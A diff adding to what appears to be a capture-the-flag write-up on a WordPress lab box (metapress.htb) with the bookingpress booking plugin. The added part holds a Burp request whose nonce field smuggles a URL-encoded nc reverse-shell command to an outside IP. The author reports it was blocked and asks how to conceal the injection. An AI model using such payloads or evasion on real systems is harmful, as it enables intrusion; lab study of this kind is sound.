@@ -44,3 +44,44 @@ A lot of useful information comes up. We are dealing with WP version 5.6.2. Anot
 Now we know there is an author account. The output also contains info that this WP version is vulnerable and it lists a handful of vulnerabilities. The author part may come in handy but how do we choose from all of these vulnerabilities? At this point I was quite confused myself. So, I went on and inspected some of the traffic with ```burpsuite```. The main functionality of the website is making bookings for an event. At closer inspection, the metapress.htb/events/ page reveals that the "bookingpress-appointment-booking" plugin is used. It is quite confusing why the wpscan tool didn't find it. If you had a similar problem and know the solution, please do no shy away from sharing with me. 
 
 
+
+
+when I send (via repeater in burpsuite):
+```
+POST /wp-admin/admin-ajax.php HTTP/1.1
+
+Host: metapress.htb
+
+Content-Length: 1098
+
+Accept: application/json, text/plain, */*
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+
+Content-Type: application/x-www-form-urlencoded
+
+Origin: http://metapress.htb
+
+Referer: http://metapress.htb/events/
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9
+
+Cookie: PHPSESSID=kfropsmmbk11sa8u4o510mdavh
+
+Connection: close
+
+
+
+action=bookingpress_before_book_appointment&appointment_data%5Bselected_category%5D=1&appointment_data%5Bselected_cat_name%5D=&appointment_data%5Bselected_service%5D=1
+
+&appointment_data%5Bselected_service_name%5D=Startup%20meeting&appointment_data%5Bselected_service_price%5D=%240.00&appointment_data%5Bservice_price_without_currency%5D=0&appointment_data%5Bselected_date%5D=2022-12-06&appointment_data%5Bselected_start_time%5D=09%3A00&appointment_data%5Bselected_end_time%5D=09%3A30&appointment_data%5Bcustomer_name%5D=&appointment_data%5Bcustomer_firstname%5D=Lyuben&appointment_data%5Bcustomer_lastname%5D=Petrov&appointment_data%5Bcustomer_phone%5D=124124&appointment_data%5Bcustomer_email%5D=laina%40lainata.com&appointment_data%5Bappointment_note%5D=lailaina&appointment_data%5Bselected_payment_method%5D=&appointment_data%5Bcustomer_phone_country%5D=US&appointment_data%5Btotal_services%5D=&appointment_data%5Bstime%5D=1670376132&appointment_data%5Bspam_captcha%5D=4ENmLFaOTr5f&_wpnonce=3b7661e5b0;rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202>%261|nc%2010.10.14.198%201234%20>/tmp/f
+```
+where ```rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202>%261|nc%2010.10.14.198%201234%20>/tmp/f``` is the URL-encoded injection.
+
+I get a response: 
+```
+{"variant":"error","title":"Error","msg":"Sorry, Your request can not process due to security reason.","redirect_url":""}
+```
+is "nonce" the vulnerable parameter? How do I conceal the injection?
